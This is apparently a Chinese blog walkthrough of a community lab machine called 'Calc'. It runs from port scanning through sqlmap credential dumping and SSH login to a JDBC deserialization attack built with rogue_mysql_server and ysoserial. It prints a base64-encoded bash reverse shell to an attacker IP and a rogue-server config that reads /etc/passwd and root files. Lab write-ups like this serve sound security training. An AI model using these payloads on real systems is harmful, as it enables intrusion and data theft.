---
title: 群友靶机之Calc.
url: https://mp.weixin.qq.com/s/_5r604orNlsDD0x3x8Ni_w
source: Doonsec's feed
date: 2026-04-17
fetch_date: 2026-04-18T04:29:22.692252
---

# 群友靶机之Calc.

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/8avkpGSKmqdiaOm7FBRzWyEadro5NxuBOIotU7Wh5ibKf8s4aibaJIjJzQh9h7Ql3h1wUkN8d1qbINcmc8Pf8poZSt2XiaqzAEicf5wtQnMhXguE/0?wx_fmt=jpeg)

# 群友靶机之Calc.

原创

MS02423
MS02423

MS02423

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

今天写一下kaada佬的Calc.的靶机wp

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqdP1wBPhrMFib3dEVDvcXm2fmtOnjk87dWJueOj2uLQibwYG0hgkKsKwVa7euv4O0BkQegq9hicTDGicjDiceSbjUicpjwdjwz0YjyeU/640?wx_fmt=png&from=appmsg)

这是kaada佬的博客

```
https://skyarrow416.github.io/
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqfuL0EkjA2hbTleVT5tfeBR3geMwPt00YwG4bzkEpZJrBIeicI8mia44Np5TBFeHMvYnjQAKjf8e1uRtL04zblDOLMVOiaJibrUkSg/640?wx_fmt=png&from=appmsg)

一.信息收集

1.探测IP

靶机IP是192.168.137.145

2.探测端口

```
nmap -p- -sV 192.168.137.145
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqfSDeWZNdORESbkjyJx8t0onK9t3Hs0F0HW6FK47ceiaia2tMsMpQgAIibMEU22MQ1RlSPPb2N4KSb28MficJRI7f9P3LiaTicI8bwQ4/640?wx_fmt=png&from=appmsg)

开放了22 80 8080端口

那么我们在80端口和8080端口上面下手，然后得到有用的信息，在22端口登录

3.探测目录

```
gobuster dir -u http://192.168.137.145 -w /usr/share/wordlists/dirb/big.txt -x php,txt,bak,zip,sh,config
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqejud3fPqJFNWBuxjJV8jFTW3UtfXXiaJ7opb42qR2ZLf2g10ZG527PyT4mrpV1okoFhQe1NTTdc28QD6iaLpBhgA5qxnLNhFtSs/640?wx_fmt=png&from=appmsg)

我们在80端口和8080端口上面都没有发现有用的目录，那么我们只能在80端口下手了

二.访问IP

```
http://192.168.137.145/
```

![](https://mmbiz.qpic.cn/mmbiz_png/8avkpGSKmqfq8w6MFcLOxxbhrovecclZf0BEibVlZRs27wEUecpfBJYEyqbDcIXyLy28cYLDAUf4ySHz1wAR9lAeFsFL1ibZlOyia56LcUQ1Dc/640?wx_fmt=png&from=appmsg)

刚开始，我因为是ssrf漏洞呢，去尝试尝试

```
{{7*7}}
```

![](https://mmbiz.qpic.cn/mmbiz_png/8avkpGSKmqeNhehxXl0Wyt5Q0nrZiaGQOsLyGJAetBUzKSz0fD2FDqkVI4TLP26HXNcEUCyNyj79JibwHa0iaK8oL8nbDhLPNbVFZDro9Tj0b8/640?wx_fmt=png&from=appmsg)

发现报错了，而且出现SQL注入，那么我们直接去爆破即可

三.渗透测试

1.SQL注入

```
GET /api/track/1 HTTP/1.1Host: 192.168.137.145User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36Accept: */*Referer: http://192.168.137.145/Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9Connection: keep-alive
```

爆破数据库

```
sqlmap -u "http://192.168.137.145/api/track/1" --dbs --batch
```

![](https://mmbiz.qpic.cn/mmbiz_png/8avkpGSKmqfTiazGbibYWLQibGjkapPKtRo10X24Aicuw54Khjic3cEQMIPxPAAjywnGneCia0P4OLaVkmiarcOtXXlV52pR2XvlWjdhtmvSLrBMKE/640?wx_fmt=png&from=appmsg)

我们可以看到存在calc\_db数据库，那么我们去爆破即可，这里我就不再多写，直接去爆破数据

```
sqlmap -u "http://192.168.137.145/api/track/1" -D 'calc_db' -T 'webapp_users' -C 'id,username,password' --dump --batch
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqcLicUiaygrIxsfYj4e3VaafrCrz0zxgYJ9BQev3toZVO4wqvu714Og8GcgpmhBORnHEAmlibm2ZbITouy3grZ1iaqrYEL7qDVUdoU/640?wx_fmt=png&from=appmsg)

爆破出来用户名和密码

```
Jimmy:JimmyThumb_Calc_2010
```

2.ssh登录

我们去登录即可

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqfqMu10CniaIWg6IQibpXkWBegWQsIoJ2T8INeyjR5V4Jum6eKdhKpX4iaF78PbibhiaB3uN98uuWCcDqtVUbPIjWXeICJzoL7oKB3A/640?wx_fmt=png&from=appmsg)

成功拿到user.txt

3.TODO.txt

我们可以看到一个TODO.txt，我们去看看

```
cat TODO.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/8avkpGSKmqcNyWWjwuia0j9RmjlphWxHLUMQlsxeNwLLF6XESNsDlu7usJjA7uoUqf8JeL2icToSGYZnibdJ2g9enkianQ1OsF9wtFBhhicgDhnc/640?wx_fmt=png&from=appmsg)

大致意思是

1. 迁移 Tomcat 端口

```
原文： Migrate Tomcat to port 80 (Currently on 8080 via reverse proxy).意思： 目前你的 Tomcat 运行在 8080 端口，前面可能挂了一个 Nginx 或 Apache 作为反向代理。现在的目标是让 Tomcat 直接监听 80 端口（即标准的 HTTP 端口），或者重新调整代理逻辑。注意： 在 Linux 中，监听 1024 以下的端口通常需要 root 权限。
```

2. 安全化本地数据库凭据

```
原文： Secure local database credentials (calc_user : vocaloid_miku_01).意思： 你的数据库账号是 calc_user，密码是 vocaloid_miku_01（看来 Jimmy 是个初音未来的粉丝）。任务： 现在的密码是明文形式，非常不安全。你需要采取措施，比如：将密码从代码中移出，放入环境变量或加密的配置文件。限制该用户的权限，仅允许本地（localhost）访问。使用权限管理工具（如 Vault）或设置合适的 Linux 文件权限（如 600），确保只有特定程序能读取。
```

3. 修复 Cron 定时任务中的同步脚本

```
原文： Fix backend_sync.jar reading system_config in cron. Do not change 700 permissions on the jar!意思： 你的后台同步程序 backend_sync.jar 在通过 cron（定时任务）运行时，无法正确读取 system_config 配置文件。关键约束：禁止修改该 JAR 包的权限（必须保持 700）。700 意味着只有文件所有者有权读取、写入和执行。可能的原因： * 路径问题：cron 运行时的默认工作目录通常是用户的家目录，导致脚本找不到相对路径下的配置文件。建议在 cron 中使用绝对路径。用户权限： 运行 cron 的用户可能不是该 JAR 包的所有者。
```

既然看到定时任务，那么我们去看看

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqcEHUSyKWkdta0ua13De4lica555jns21aqiaK6oYO2afSExqXcG9aRSRVTVA1oLdB9goIwRhR8KLua0g0DvPbeZgAb55gUzvicoo/640?wx_fmt=png&from=appmsg)

```
 /bin/sh -c /usr/bin/java -jar /opt/backend_sync.jar >/dev/null 2>&1
```

每分钟去执行这个脚本，我们去看看

4.定时任务

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqefzlia5ZRyX0g9XyuJia4SLI9t5pqo5y1uAtrjJdickbLRtOhfMwGl6piceMgP0ialysjYdrpia8aRbYmZFbfiaDpQKAWoUwfF5U0Dtw/640?wx_fmt=png&from=appmsg)

然后AI告诉我去配置文件文件注入，但是没有找到配置文件

![](https://mmbiz.qpic.cn/mmbiz_png/8avkpGSKmqdzqPgNAfjcmyRxKu9icQ8NE994FJ7NokFTDib7iazGAqGqTXDic7PdDmsI98VI4IxZAQZqVGqqx4mp496BBKJsjqjAtqNyN8rMdkQ/640?wx_fmt=png&from=appmsg)

那么，我们去下载下来看看这个脚本

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqc4RksQQgBFEvnlHNWpJdSnTnOzEzaSRlOLCuuuVHjSstlBlSRgxXWcbU1k96eXWtCULNzUjWXJrsVtqIQUgiaLVOUvp7Xx7lMk/640?wx_fmt=png&from=appmsg)

我们去反编译看看

![](https://mmbiz.qpic.cn/mmbiz_png/8avkpGSKmqf98sN86hRrzhibFpxWAObmArEhIIW990dqQ0AxfR2FDlmzqVjQhV0UFYPVnPEtickaGCJb23ZuK42YHQCeT4ica2BhBZuxRcktNY/640?wx_fmt=png&from=appmsg)

我们可以看到提示中的system\_config是在数据库里的，且可以打jdbc url注入

5.jjdbc url注入

首先，我们需要去下载工具的

rogue\_mysql\_server

(1)下载地址

```
https://github.com/rmb122/rogue_mysql_server/releases/tag/v1.0.1
```

![](https://mmbiz.qpic.cn/mmbiz_png/8avkpGSKmqd16vnS1AjQiaLqDWhVN1NRRgMw5HBOLhCfxDPb3bdwaMtnuDr556bPosELxa86MyZQ1nhA3UfzT2TJWylnIzE3STmveibkse4Zc/640?wx_fmt=png&from=appmsg)

下载ysoserial-all.jar工具

```
https://github.com/frohoff/ysoserial/releases/tag/v0.0.6
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqfkaN5VN4fNnTuXEQWDKqveG0IblzuD083thpyVDWS409LrZU8FEwIlNM1iashVKO5b9ecGR6CqGxrh867j5Uxdzbn4rYMWdS8g/640?wx_fmt=png&from=appmsg)

(2)修改配置文件

刚刚开始我修改的文件内容为

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqcWscg8urzLp6zJ3VZ7ceQm8DPUA7aTDS7libiazRVWXhbGdZqovhLBm04WZiaPcvnXBT8ECs1NHQQrMK2sSibO37W3r6bHFJsqzKc/640?wx_fmt=png&from=appmsg)

```
jdbc_exploit: false 改成truecc5-reverse-shell: ["java", "-jar", "/tmp/ysoserial-all.jar", "CommonsCollections5", bash -c '{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEzNy4xMDIvMTIzNCAwPiYxCg==}|{base64,-d}|{bash -i}']/tmp/ysoserial_all.jar是你ysoserial-all.jar工具地址bash -c '{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEzNy4xMDIvMTIzNCAwPiYxCg==}|{base64,-d}|{bash -i}'监听地址echo "bash -i >& /dev/tcp/192.168.137.102/1234 0>&1" | base64YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEzNy4xMDIvMTIzNCAwPiYxCg==
```

然后我去运行文件报错了

```
./rogue_mysql_server -config   config.yaml
```

![](https://mmbiz.qpic.cn/mmbiz_png/8avkpGSKmqc3ReyL13UWyKMOFfLmlraHfpMjwCcoIN3PC06qGofVQlruBcCvtYZia3GHGBUyE6EEibIlzA0WxMFwHRG97jHdgNXTia4FA6QX2c/640?wx_fmt=png&from=appmsg)

报错原因好像是我java版本号太高了

现在的 exit status 70 回到了我们最开始讨论的 Java 高版本反射限制问题。

由于你的 Kali 运行的是 Java 17 或 Java 21，它默认禁止了 ysoserial 所需的深层反射。你需要把那些“通关参数”直接写进 config.yaml 的命令数组里。

我们重新写一下

 payload.ser文件里面写入

```
java --add-opens=java.base/java.lang=ALL-UNNAMED \     --add-opens=java.base/java.util=ALL-UNNAMED \     --add-opens=java.management/javax.management=ALL-UNNAMED \     -jar /tmp/ysoserial-all.jar \     CommonsCollections6 \     "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEzNy4xMDIvMTIzNCAwPiYxCg==}|{base64,-d}|{bash,-i}" > /tmp/payload.ser
```

在config.yaml写入

```
host: 0.0.0.0port: 3306version_string: "10.4.13-MariaDB-log"
file_list: ["/etc/passwd", "C:/boot.ini", "/root/root.txt"]save_path: ./lootalways_read: truefrom_database_name: falsemax_file_size: 0
auth: falseusers:  - root: root  - root: password
jdbc_exploit: truealways_exploit: falseysoserial_command:  cc5-reverse-shell: ["cat", "/tmp/payload.ser"]
```

(3)运行文件

```
 ./rogue_mysql_server -config config.yaml
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqeyoY4akWtt39OO0vJ5kibxa52Rxu7S3BNmT26fWEdTjSsH2PV5icxO7zSYticV1xibeX2pgnI0F4mCL8ibPZWX8TibtUQicLl181ic7uA/640?wx_fmt=png&from=appms...